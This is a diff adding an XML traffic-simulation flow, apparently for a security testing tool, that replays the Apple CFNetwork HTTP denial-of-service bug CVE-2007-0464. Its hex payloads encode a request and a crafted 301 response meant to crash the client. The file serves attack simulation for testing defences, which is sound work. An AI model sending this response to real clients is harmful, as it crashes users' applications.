@@ -1,0 +1,30 @@
+<?xml version="1.0" encoding="utf-8"?>
+<Flow closetype="client_fin" layer="tcp" name="cfnetwork_dos" type="attack">
+    <MetaData application="base_threats" attackIntent="Crashing Denial_of_Service" bugtraqId="" createDate="10/18/2011" cveId="CVE-2007-0464" description="Apple CFNetwork HTTP Response Denial of Service" details="This threat simulates a client requesting a  file, and the server replying with a maliciously constructed HTTP response. This response will cause a null pointer dereference in the CFNetwork framework, which is built in to Mac OS X, and can be used for client applications. If it is built in to the application, the null pointer dereference the threat causes will crash the application." equipmentType="Application" osvdbId="" protocol="HTTP" severity="" vendorsAffected="Apple"/>
+    <Packets>
+		<Loop>
+        <Packet name="packet_0" pktDelay="0" tx="client">
+            <frame>
+                <config>
+                    <pdus>
+                        <pdu name="Payload" pdu="custom:Custom">
+                            <pattern>474554202f20485454502f312e300d0a0d0a</pattern>
+                        </pdu>
+                    </pdus>
+                </config>
+            </frame>
+        </Packet>
+        <Packet name="packet_1" pktDelay="0" tx="server">
+            <frame>
+                <config>
+                    <pdus>
+                        <pdu name="Payload" pdu="custom:Custom">
+                            <pattern>485454502F312E3120333031204F4B0D0A436F6E74656E742D547970653A20746578742F68746D6C0D0A436F6E74656E742D4C656E6774683A2035350D0A4C6F636174696F6E3A20687474703A2F2F6E6F6E6578697374656E743132330D0A0D0A58585858585858585858585858585858585858585858585858585858585858585858585858585858585858585858585858585858585858</pattern>
+                        </pdu>
+                    </pdus>
+                </config>
+            </frame>
+        </Packet>
+		</Loop>
+    </Packets>
+</Flow>
